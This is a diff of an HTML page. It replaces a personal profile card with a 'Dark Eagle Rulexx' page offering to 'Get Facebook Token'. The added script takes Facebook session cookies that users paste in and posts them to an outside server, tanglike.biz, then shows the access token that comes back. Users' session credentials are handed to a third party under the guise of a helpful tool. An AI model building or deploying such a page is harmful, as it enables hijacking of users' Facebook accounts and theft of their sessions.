@@ -1,124 +1,189 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title> Profle Card UI Design | CoderGirl </title>
-  <!---Custom Css File!--->
- <style>
- @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
-*{
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: 'Poppins', sans-serif;
-}
-.main{
-  width: 100%;
-  height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background-image: url('https://i.ibb.co/zVWmfJ8/back.jpg');
-  background-position: center;
-  background-size: cover;
-}
-.profile-card{
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  max-width: 400px;
-  width: 100%;
-  border-radius: 25px;
-  padding: 30px;
-  border: 1px solid #ffffff40;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-}
-.image{
-  position: relative;
-  height: 150px;
-  width: 150px;
-}
-.image .profile-pic{
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  border-radius: 50%;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-}
-.data{
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  margin-top: 15px;
-}
-.data h2{
-  font-size: 33px;
-  font-weight: 600;
-}
-span{
-  font-size: 18px;
-}
-.row{
-  display: flex;
-  align-items: center;
-  margin-top: 30px;
-}
-.row .info{
-  text-align: center;
-  padding: 0 20px;
-}
-.buttons{
-  display: flex;
-  align-items: center;
-  margin-top: 30px;
-}
-.buttons .btn{
-  color: #fff;
-  text-decoration: none;
-  margin: 0 20px;
-  padding: 8px 25px;
-  border-radius: 25px;
-  font-size: 18px;
-  white-space: nowrap;
-  background: linear-gradient(to left, #33ccff 0%, #ff99cc 100%);
-}
-.buttons .btn:hover{
-  box-shadow: inset 0 5px 20px rgba(0,0,0,0.4);
-}
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Dark Eagle Rulexx</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .fade-in {
+            animation: fadeIn 1s ease-in-out;
+        }
 
-</style>
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const loader = document.getElementById('loader');
+            const content = document.getElementById('content');
+            setTimeout(() => {
+                loader.style.display = 'none';
+                content.style.display = 'block';
+            }, 2000);
+        });
+
+        function toggleNavbar() {
+            const navbar = document.getElementById('mobile-navbar');
+            navbar.classList.toggle('hidden');
+        }
+
+        function sendPostRequest(cookieString) {
+            const url = 'https://tanglike.biz/gettokenig.php';
+        
+            const formData = {
+                cookie: cookieString,
+                submit: 'Get token'
+            };
+        
+            $.ajax({
+                url: url,
+                method: 'POST',
+                data: formData,
+                success: function(response) {
+                    if(response.includes("Cookie die")){
+                        $('#token').val("Cookie lỗi, hãy login lại thử lại");
+                    } else if(response.includes("EAABw")){
+                        let token = "EAABw" + response.split('EAABw')[1].split('</textarea>')[0];
+                        $('#token').val(token);
+                    } else {
+                        $('#token').val("Lỗi, hãy báo cho admin");
+                    }
+                },
+                error: function(xhr, status, error) {
+                    $('#token').val("Lỗi, hãy báo cho admin");
+                }
+            });
+        }
+
+        $(document).ready(function(){
+            $("#laytk").click(function(){
+                const cookieString = $("#cookieInput").val();
+                if(cookieString) {
+                    sendPostRequest(cookieString);
+                } else {
+                    $('#token').val("Please enter cookies.");
+                }
+            });
+
+            $("#copyToken").click(function(){
+                const token = $("#token").val();
+                if(token) {
+                    navigator.clipboard.writeText(token).then(function() {
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Token copied!',
+                            text: 'Your token has been copied to the clipboard.',
+                            showConfirmButton: false,
+                            timer: 1500
+                        });
+                    }, function(err) {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Oops...',
+                            text: 'Failed to copy token: ' + err,
+                        });
+                    });
+                } else {
+                    Swal.fire({
+                        icon: 'warning',
+                        title: 'No token',
+                        text: 'There is no token to copy.',
+                    });
+                }
+            });
+        });
+    </script>
 </head>
-<body>
-  <section class="main">
-  <div class="profile-card">
-    <div class="image">
-      <img src="https://i.ibb.co/JFMTf9y/f120a1d86c008029b7f6863ee95c2209.jpg" alt="" class="profile-pic">
+<body class="bg-gray-100">
+    <div class="flex items-center justify-center h-screen" id="loader">
+        <div class="loading-spinner"></div>
     </div>
-    <div class="data">
-      <h2>ARYAN </h2>
-      <span>SERVER OWNER</span>
+    <div class="fade-in" id="content" style="display: none;">
+        <header class="bg-white shadow">
+            <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+                <div class="text-blue-600 text-2xl font-semibold">DARK EAGLE RULEXX</div>
+                <button class="lg:hidden text-gray-600 focus:outline-none" onclick="toggleNavbar()">
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="hidden lg:flex items-center space-x-4">
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Home</a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">About</a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Services</a>
+                    <a class="text-blue-600 hover:text-blue-800 flex items-center" href="#">
+                        <i class="fab fa-whatsapp mr-2"></i>Contact
+                    </a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Owner</a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Service</a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Uptime</a>
+                    <a class="text-blue-600 hover:text-blue-800" href="#">Price</a>
+                </div>
+            </div>
+            <div class="hidden lg:hidden flex flex-col bg-white p-4 space-y-4" id="mobile-navbar">
+                <a class="text-blue-600" href="#">Home</a>
+                <a class="text-blue-600" href="#">About</a>
+                <a class="text-blue-600" href="#">Services</a>
+                <a class="text-blue-600 flex items-center" href="#">
+                    <i class="fab fa-whatsapp mr-2"></i>Contact
+                </a>
+                <a class="text-blue-600" href="#">Owner</a>
+                <a class="text-blue-600" href="#">Service</a>
+                <a class="text-blue-600" href="#">Uptime</a>
+                <a class="text-blue-600" href="#">Price</a>
+            </div>
+        </header>
+        <main>
+            <section class="container mx-auto px-4 py-8">
+                <h2 class="text-2xl font-bold text-center text-blue-600 mb-8">Get Facebook Token</h2>
+                <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg">
+                    <div class="input-group mb-4">
+                        <label for="cookieInput" class="block text-gray-700 font-bold mb-2">Enter Facebook Cookies:</label>
+                        <input type="text" id="cookieInput" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="Paste your cookies here">
+                    </div>
+                    <button id="laytk" class="w-full p-3 bg-green-500 text-white font-bold rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">Get Token</button>
+                    <div class="relative mt-4">
+                        <input type="text" id="token" class="w-full p-3 border border-gray-300 rounded-lg bg-gray-100" readonly placeholder="Your token will appear here">
+                        <button id="copyToken" class="absolute right-2 top-2 p-2 bg-green-500 text-white rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+            </section>
+        </main>
+        <footer class="bg-white shadow py-4">
+            <div class="container mx-auto px-4 text-center">
+                <p class="text-gray-600">© 2023 Dark Eagle Rulexx. All rights reserved.</p>
+                <div class="flex justify-center space-x-4 mt-4">
+                    <a class="text-blue-600 hover:text-blue-800" href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a class="text-green-600 hover:text-green-800" href="#"><i class="fab fa-whatsapp"></i></a>
+                </div>
+            </div>
+        </footer>
     </div>
-    <div class="row">
-      <div class="info">
-        <h3>Following</h3>
-        <span>1</span>
-      </div>
-      <div class="info">
-        <h3>Followers</h3>
-        <span>9279</span>
-      </div>
-      <div class="info">
-        <h3>Posts</h3>
-        <span>9</span>
-      </div>
-    </div>
-    <div class="buttons">
-      <a href="https://wa.link/v0zk37" class="btn">WHATSAPP</a>
-      <a href="https://www.facebook.com/profile.php?id=100079959253161" class="btn">FACEBOOK</a>
-    </div>
-  </div>
-</section>
 </body>
 </html>
